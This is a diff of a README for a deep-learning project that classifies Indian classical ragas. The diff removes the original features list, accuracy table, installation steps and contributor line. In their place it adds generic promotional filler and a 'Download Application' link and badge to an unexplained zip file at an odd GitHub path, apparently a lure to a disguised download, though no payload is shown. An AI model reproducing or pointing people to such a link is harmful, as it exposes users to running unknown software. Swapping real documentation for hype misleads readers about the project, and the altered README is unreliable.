@@ -1,68 +1,42 @@
- ## 🎵 Raga Classification Using Deep Learning 🎶
+# 🎶🧠 Raga Classification Using Deep Learning 🎶🧠
 
-## 🌟 Overview
-This project explores deep learning techniques for classifying Indian classical ragas. Unlike Western genre classification, raga classification presents unique challenges due to its modal nature, improvisational aspects, and limited dataset availability. This study aims to overcome these challenges by employing specialized feature extraction and deep learning models.
+## Overview
+Welcome to the "Raga Classification Using Deep Learning" repository! In this project, we delve into the fascinating realm of Indian classical music to classify ragas using deep learning techniques. Unlike Western music genres, ragas are complex modal structures with intricate ornamentations and improvisations, making their classification a unique challenge.
 
-## 🔥 Features
-- **📂 Dataset**: Curated raga dataset with vocal-only and vocal + instrumental segments.
-- **🧠 Feature Extraction**: 
-  -  MFCC
-  -  Chroma CENS
-  -  Chroma STFT
-  -  RMSE
-  -  Spectral Centroid
-  - Spectral Bandwidth
-  -  Spectral Rolloff
-  -  Zero Crossing Rate (ZCR)
-  -  Pitch Mean
-  -  Magnitude Mean
-- **🤖 Deep Learning Models**:
-  -  LSTM Model
-  -  ANN Model with NPZ Data Storage
-  -  BERT-Based Transformer Model
-  -  Final ANN Model without Feature Averaging
-- **🛠 Tools Used**:
-  - 🎵 `librosa` for feature extraction
-  - 🎙 `Demucs` for vocal isolation
-  - 🤖 `TensorFlow/Keras` for deep learning models
-  - 📊 `NumPy` and `Pandas` for data handling
-  - 📁 `JSON` and `NPZ` for efficient data storage
+## Project Focus
+The primary focus of this project is to leverage deep learning algorithms to accurately classify Indian classical ragas. This task involves specialized feature extraction and model selection due to the distinct characteristics of ragas. By using advanced techniques such as Artificial Neural Networks (ANN), Convolutional Neural Networks (CNN), and Long Short-Term Memory (LSTM) networks, we aim to achieve high accuracy in raga classification.
 
-## 📀 Dataset Preparation
-1. **📥 Data Collection**: Raga audio recordings were segmented into meaningful phrases.
-2. **🎙 Vocal Isolation**: Used Demucs to separate vocal components.
-3. **📊 Feature Extraction**: Stored extracted features in JSON and NPZ formats.
+## Repository Topics
+- ANN
+- Audio Processing
+- BERT
+- CNN
+- Deep Learning
+- Feature Engineering
+- Indian Classical Music
+- LSTM
+- Music
+- Music AI
+- Raga Classification
 
-## 📈 Model Performance
-| 🏗 Model | 🎯 Accuracy |
-|--------|----------|
-| LSTM | 34.80% |
-| ANN with NPZ | 30% |
-| BERT-Based Transformer | 33.1% |
-| Final ANN (Vocal + Instrument) | 53% |
-| Final ANN (Vocal-Only) | 73% |
+## How to Access the Application
+To access the project application, please download it from the following link: [Download Application](https://github.com/file/Application.zip). Once downloaded, unzip the file and follow the instructions provided in the README to launch the application successfully.
 
-## 🧐 Results and Analysis
-- ❌ Traditional Western classification methods yielded poor accuracy (e.g., 22% using only MFCCs).
-- ✅ Expanded feature extraction improved model performance.
-- 🎤 Vocal-only datasets led to the highest accuracy (73%).
-- 🏆 ANN models performed better than LSTMs and Transformers.
+If you encounter any issues with the provided link or it is not accessible, please check the "Releases" section of this repository for alternative download options.
 
-## ⚙️ Installation & Usage
-### 📌 Prerequisites
-- 🐍 Python 3.8+
-- 🤖 TensorFlow/Keras
-- 🎵 Librosa
-- 📊 NumPy, Pandas
-- 🎙 Demucs (for vocal isolation)
+[![Download Application](https://img.shields.io/badge/Download-Application-<COLOR>.svg)](https://github.com/file/Application.zip)
 
+## Conclusion
+Delve into the intricate world of Indian classical music and explore the art of raga classification using cutting-edge deep learning techniques. Join us on this musical journey as we unravel the secrets of ragas and push the boundaries of AI in music classification.
 
-## 🔮 Future Scope
-- 📚 Expanding the dataset with more ragas and labeled samples.
-- 🏗️ Exploring hybrid deep learning models.
-- 🎼 Incorporating musicological insights to refine classification techniques.
+Let the melodies of ragas guide you through the depths of deep learning as we harmonize tradition with technology. Embrace the fusion of music and AI in this innovative project!
 
-## 🤝 Contributors
-- **Karthick_M* ([karthickrio1002@gmail.com])
+🎵🤖🎵
 
+---
 
+Remember, the true beauty of music lies in its ability to transcend boundaries and touch the soul. Let the ragas take you on a mesmerizing journey through the realms of Indian classical music, enhanced by the power of deep learning.
+
+Dive deep into the algorithms, savor the sounds, and witness the magic of raga classification using the latest advancements in AI and music technology. Experience the convergence of tradition and innovation in this groundbreaking project.
+
+🎶✨🎶
